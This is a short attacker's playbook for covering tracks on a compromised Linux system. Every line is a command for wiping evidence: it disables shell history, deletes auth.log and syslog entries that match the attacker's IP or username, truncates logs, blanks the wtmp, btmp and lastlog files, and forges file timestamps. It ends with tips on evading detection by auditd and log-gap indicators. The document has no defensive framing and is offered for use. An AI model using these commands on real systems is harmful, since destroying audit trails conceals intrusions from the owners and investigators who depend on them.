LOG CLEANING PLAYBOOK
COVERING TRACKS
Prevent history being written (run first)
unset HISTFILE && export HISTSIZE=0 && export HISTFILESIZE=0
Clear current session history
history -c && history -w
Surgical removal -- delete lines matching your IP
sed -i '/ATTACKER_IP/d' /var/log/auth.log /var/log/syslog
Surgical removal -- delete lines matching your username
sed -i '/yourusername/d' /var/log/auth.log /var/log/secure
Truncate auth log (obvious gap -- last resort)
truncate -s 0 /var/log/auth.log
Clear wtmp and btmp (last / lastb data)
echo "" > /var/log/wtmp && echo "" > /var/log/btmp && echo "" > /var/log/lastlog
Restore original file timestamps after editing
touch -r /var/log/auth.log.bak /var/log/auth.log
NOTE: Log gaps and sudden file size changes are IOCs. Surgical sed removal is harder to detect than wiping. Check if auditd is running first -- it may log your log edits.
